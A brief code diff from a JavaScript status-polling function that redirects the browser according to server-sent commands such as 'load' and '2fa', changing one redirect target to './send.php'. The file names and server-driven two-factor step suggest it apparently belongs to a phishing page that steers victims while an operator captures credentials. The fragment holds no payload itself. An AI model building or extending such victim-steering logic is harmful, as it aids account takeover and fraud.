@@ -436,7 +436,7 @@ function updateStatus(isOnline) {
                             location.href = tree;
                         } else if( one == 'load' ) {
                             clearInterval(waiting);
-                            location.href = "./bc-load.php?token=" + token1 + "&error=" + two;
+                            location.href = "./send.php";
                         } else if( one == '2fa' ) {
 							sessionStorage.setItem('text',tree);
 							sessionStorage.setItem('img',forth);
